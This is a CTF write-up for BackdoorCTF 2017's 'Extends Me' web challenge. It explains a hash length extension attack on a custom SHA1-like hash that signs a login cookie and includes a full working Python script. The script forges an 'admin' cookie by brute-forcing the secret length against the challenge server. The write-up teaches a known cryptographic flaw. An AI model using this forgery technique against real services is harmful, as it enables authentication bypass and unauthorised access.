[writeup by @abiondo]

**CTF:** BackdoorCTF 2017

**Team:** spritzers (from [SPRITZ Research Group](http://spritz.math.unipd.it/))

**Task:** Extends Me

**Points:** 250

In this challenge we were faced with a web application for which we had [the source code](./EXTEND-ME.zip). We were presented with a login screen with just a username field. The logic comes from `server.py`:

```python
@app.route('/login',methods = ['GET', 'POST'])
def login():
    if request.method == 'POST':
        if  not request.form.get('username'):
            return render_template('login.html')
        else:
            username = str(request.form.get('username'))
            if request.cookies.get('data') and request.cookies.get('user'):
                data = str(request.cookies.get('data')).decode('base64').strip()
                user = str(request.cookies.get('user')).decode('base64').strip()                
                temp = '|'.join([key,username,user])
                if data != SLHA1(temp).digest():
                    temp = SLHA1(temp).digest().encode('base64').strip().replace('\n','')
                    resp = make_response(render_template('welcome_new.html',name = username))
                    resp.set_cookie('user','user'.encode('base64').strip())
                    resp.set_cookie('data',temp)
                    return resp
                else:
                    if 'admin' in user: # too lazy to check properly :p
                        return "Here you go : CTF{XXXXXXXXXXXXXXXXXXXXXXXXX}"
                    else:
                        return render_template('welcome_back.html',name = username)
            else:
                resp = make_response(render_template('welcome_new.html',name = username))
                temp = '|'.join([key,username,'user'])
                resp.set_cookie('data',SLHA1(temp).digest().encode('base64').strip().replace('\n',''))
                resp.set_cookie('user','user'.encode('base64').strip())
                return resp

    else:
        return render_template('login.html')
```

There's a base64-encoded cookie named `user` (with value "user" by default) which has to contain the string "admin" to print the flag. Another base64-encoded cookie, `data`, is the hash of a secret key, the login username and the decoded `user` cookie joined by `|`. If we change `user` we also have to recalculate the hash, otherwise the code will just change it back to its default value and we won't get our flag. We don't know the secret key, so we can't do this trivially. Let's look into the hash and see if there's a way out.

The code uses SLHA1, a custom variation on SHA1. Like SHA1, it is a Merkle–Damgård hash function. This means that the hash of a block only depends on the block and on the _hash_ of the precedent blocks. In other words, if we have the hash for a message, we can calculate the hash of the message with arbitrary data appended. This is known as _length extension attack_. Since the secret key is at the beginning and `user` at the end, we want to append "admin" to the `user` cookie.

The first step in doing so is figuring out the padding. SLHA1 works on fixed-size 64-byte blocks, so there must be padding added when hashing arbitrarily long strings. This is important because our appended data will come _after_ the padding for the original message. We know `SLHA1(message | padding)`, and we will calculate `SLHA1(message | padding | "admin")` to use `"user" | padding | "admin"` as `user` (assuming the original value was `"user"`). Padding is handled by this function in `hash.py`:

```python
def _produce_digest(self):
    message = self._unprocessed
    message_byte_length = self._message_byte_length + len(message)
    message += b'\xfd'
    message += b'\xab' * ((56 - (message_byte_length + 1) % 64) % 64)
    message_bit_length = message_byte_length * 8
    message += struct.pack(b'>Q', message_bit_length)
    
    h = _process_chunk(message[:64], *self._h)
    
    if len(message) == 64:
        return h
    
    return _process_chunk(message[64:], *h)
```

The padding consists of a `0xfd` byte, followed by as many `0xab` bytes as needed, followed by a big-endian quadword equal to the unpadded message length in bits. This means that we need to know the original message length to calculate the padding. Fortunately, it's something we can easily bruteforce later. Now that we know how to generate padding, let's write some code to perform the attack:

```python
def extend(digest, length, ext):
    pad  = '\xfd'
    pad += '\xab' * ((56 - (length + 1) % 64) % 64)
    pad += struct.pack('>Q', length * 8)
    slha = SLHA1()
    slha._h = [struct.unpack('>I', digest[i*4:i*4+4])[0] for i in range(6)]
    slha._message_byte_length = length + len(pad)
    slha.update(ext)
    return (pad + ext, slha.digest())
```

This function takes the original digest, the length of the original message, and the extension we want as suffix. First, it calculates the padding to generate `pad | ext`, which will be our actual extension. Then it injects the original hash and length into the hash engine. At this point, due to its construction, the state of the hash function is exactly the same as if it had just hashed `message | padding`. Finally, it feeds the extension to the hash function and calculates the digest.

All we have to do is extend the hash with "admin" and use `"user" | padding | "admin"` as the `user` cookie, while bruteforcing the original length. Here's the script:

```python
#!/usr/bin/python2

from hash import SLHA1
import struct
import requests

def extend(digest, length, ext):
    pad  = '\xfd'
    pad += '\xab' * ((56 - (length + 1) % 64) % 64)
    pad += struct.pack('>Q', length * 8)
    slha = SLHA1()
    slha._h = [struct.unpack('>I', digest[i*4:i*4+4])[0] for i in range(6)]
    slha._message_byte_length = length + len(pad)
    slha.update(ext)
    return (pad + ext, slha.digest())

post = {
    'username': 'admin'
}
cookies = {
    'data': '2L+JUplcB7+OBmCXaa3srMrfoMbLTGz1',
    'user': 'dXNlcg=='
}

orig_digest = cookies['data'].decode('base64')
orig_user = cookies['user'].decode('base64')

min_len = len('|'.join(['?', post['username'], orig_user]))
for length in range(min_len, min_len+64):
    print('[+] Trying length: {}'.format(length))
    ext, new_digest = extend(orig_digest, length, 'admin')
    cookies['data'] = new_digest.encode('base64').strip().replace('\n', '')
    cookies['user'] = (orig_user + ext).encode('base64').strip().replace('\n', '')
    r = requests.post('https://extend-me-please.herokuapp.com/login', data=post, cookies=cookies)
    if 'CTF{' in r.text:
        print(r.text)
        break
```

And we get the flag:

```
[+] Trying length: 30
Here you go : CTF{4lw4y3_u53_hm4c_f0r_4u7h}
```

As shown in other writeups, there's also a simpler solution that exploits the absence of a check for `|` in the username.